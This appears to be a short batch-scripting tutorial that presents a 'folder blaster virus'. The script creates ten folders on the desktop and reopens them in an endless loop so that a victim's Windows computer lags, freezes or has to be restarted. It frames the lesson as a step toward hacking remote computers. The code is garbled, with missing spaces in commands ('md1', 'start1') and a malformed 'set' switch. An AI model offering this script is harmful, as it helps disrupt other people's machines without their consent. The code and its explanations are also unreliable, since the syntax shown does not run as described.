Folder Blaster

Doing the old stuff in new ways

Most of the commands we use to make batch files are actually the same commands first implemented in MS-DOS, an ancient microsoft OS. These DOS or Disk Operating System commands can also be used in the command prompt window. Whateer your batch file does, you can dot in in the Command Line Interface (CLI).

You will soon be learning how to hack into a remote computer and get the CMD window of the victim's computer. We recommend that you getb used to CLI as much as you can and as much as possible. Before getting to the code, lets take a look at a couple of commands.

md (mkdir) or Make Directory - this command is used to make a folder.

cd - change directory - this command is used to change current directory.

Here we've got the folder blaster virus. We will be doing a bunch of folders, opening them all at once and keep them open, effectively hogging a big portion of the memory causing windows to lag, freeze up, or sometimes crash.

@echo off
cd ./Desktop
md1
md2
md3
md4
md5
md6
md7
md8
md9
md0
:confirm
start1
start2
start3
start4
start5
start6
start7
start8
start9
start0
goto confirm

So we begin by turning off echo. Then we chage directory to desktop. Now we create ten folders with names 0-9. We setup a label and start opening up all the ten folders. Now the final statement causes an infinite loop. Ig the folder is opened it will be opened again. So the victim will be stuck as every time he/she closes a folder it opens up again, eventually making them give up and restart the computer.

The above code can be made much shorter with the use of loops, as discussed below. We start by creating a variable and setting it to 0. We use this variable as a check to let the computer know when to comeout of the loop.

@echo off
set /a i=0
:loop
if %i%==10 goto end
echo This is iteration %i%.
set a/ i=%i%+1
goto loop
:end

set is used to define and initialize a variable. Here we create a variable called "i" and set its value to 0. After setting up a label, we checkn if the value of the variable i (given by %i%) is equal to 10, and if it is we goto the label end. Now we echo to notify the user which iteration is currently running. In the next step we increment the value of i by one and then go back to the if statement.

So the loop runs ten times and stops.
